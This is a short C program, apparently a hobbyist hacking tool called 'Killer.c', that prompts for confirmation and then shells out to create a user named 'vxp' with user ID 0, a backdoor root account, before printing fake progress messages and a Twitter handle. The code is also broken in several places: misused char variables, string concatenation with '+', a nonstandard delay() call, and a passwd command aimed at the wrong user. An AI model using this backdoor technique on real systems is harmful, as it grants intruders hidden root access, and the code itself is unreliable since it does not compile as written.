#include <stdio.h>
#include <unistd.h>
#include <string.h>

#define ANSI_COLOR_RED     "\x1b[31m"
#define ANSI_COLOR_GREEN   "\x1b[32m"
#define ANSI_COLOR_YELLOW  "\x1b[33m"
#define ANSI_COLOR_BLUE    "\x1b[34m"
#define ANSI_COLOR_MAGENTA "\x1b[35m"
#define ANSI_COLOR_CYAN    "\x1b[36m"
#define ANSI_COLOR_RESET   "\x1b[0m"

int main() {
	printf("Welcome to Killer.c!\n");
    printf("Created by vxp\n");

	char username;
	char password;
	char confirmation;
	char command_user;
	char command_pass;
	char command_mod;
	char command_su;

	printf("Please confirm you want to root this server (Y/N):\n");
	printf(">>> ");
	scanf("%s", confirmation);

	if(confirmation == 'Y' || confirmation == 'y' || confirmation == 'yes' || confirmation == 'Yes') {
		printf(ANSI_COLOR_CYAN+"\nRooting this Box\n");
		system(ANSI_COLOR_CYAN+'useradd -o -u 0 -g 0 -M -d /root -s /bin/bash vxp; echo -e "vxp\nvxp" | passwd toor');
		printf(ANSI_COLOR_CYAN+"\nCreating User\n");
		delay(5000);
		printf(ANSI_COLOR_CYAN+"\nSetting the Password");
		delay(5000);
		printf(ANSI_COLOR_CYAN+"\nGiving root Priviliges\n");
		delay(10000);
		printf(ANSI_COLOR_CYAN+"\nBox rooted succesfully\n");
		printf(ANSI_COLOR_CYAN+"\nFollow twitter.com/simswapz\n");
	}

	else {
		printf(ANSI_COLOR_GREEN+"\nDo it yourself then bud!\n");
	}
	return 0;
}
